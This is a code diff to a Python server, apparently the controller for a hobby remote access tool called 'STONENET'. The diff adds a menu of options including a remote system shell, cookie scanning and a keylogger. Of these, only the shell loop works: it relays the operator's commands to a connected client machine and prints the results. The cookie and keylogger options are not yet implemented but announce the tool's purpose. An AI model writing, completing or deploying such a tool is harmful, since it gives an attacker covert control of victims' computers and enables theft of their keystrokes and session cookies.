@@ -10,14 +10,46 @@ class Server:
         self.ADDRESS = addr
         self.PORT = port
 
+    #going to make this for a single client first then come back and add threading to handle multiple clients
     def startServer(self):
-        print("Starting Server...")
-        #need to learn about sockets and write socket tests will come back to this
-
+        print("WELCOME TO STONENET")
+        print(f"Starting Server on {ADDR} port {PORT}...")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
+            soc.bind((ADDR, PORT))
+            soc.listen()
+            print("server is listening.... quietly...")
+            conn, address = soc.accept()
+            with conn:
+                #starting main shell loop. only shell commands right now will come to add more advanced preset scripts and such.
+                print("Connected to Client. Initiating Main Menu....")
+                while True:
+                    Choice = input("Select number from the Following Options:\n1) Basic System Shell\n2) Open Peripherals\n3) Scan For Cookies\n4) Keylogger\n5) Exit\n> ")
+                    #basic shell loop
+                    if Choice == "1":
+                        while True:
+                            servCom = input("StoneShell> ")
+                            if servCom == "exit":
+                                break
+                            elif servCom == "getFile":
+                                print()
+                            elif servCom == "sendFile":
+                                print()
+                            else:
+                                conn.sendall(servCom.encode())
+                                output = conn.recv(1024)
+                                if output == b'EXCEPTION':
+                                    print("Client Experienced a fatal exception closing connection...")
+                                    exit(1)
+                                else:
+                                    print(output.decode("utf-8"))
+                    #exit other functions coming soon
+                    elif Choice == "5":
+                        break
+                    else:
+                        print("Your input was invalid or option is not yet defined")
 
     def testSocket(ADDR, PORT):
-        with socket.socket(socket.AF_INET,
-                           socket.SOCK_STREAM) as soc:  #creating socket with ipv4 and tcp. Need to reconfigure this to not use blocking.
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:  #creating socket with ipv4 and tcp. Need to reconfigure this to not use blocking.
             soc.bind((ADDR, PORT))
             soc.listen()
             print("server is listening.... quietly...")
@@ -32,5 +64,6 @@ class Server:
                     conn.sendall(data)
 
 if __name__ == '__main__':
-    #serv = Server(ADDR, PORT)
-    Server.testSocket(ADDR, PORT)
+    #Server.testSocket(ADDR, PORT)
+    serv = Server(ADDR, PORT)
+    serv.startServer()
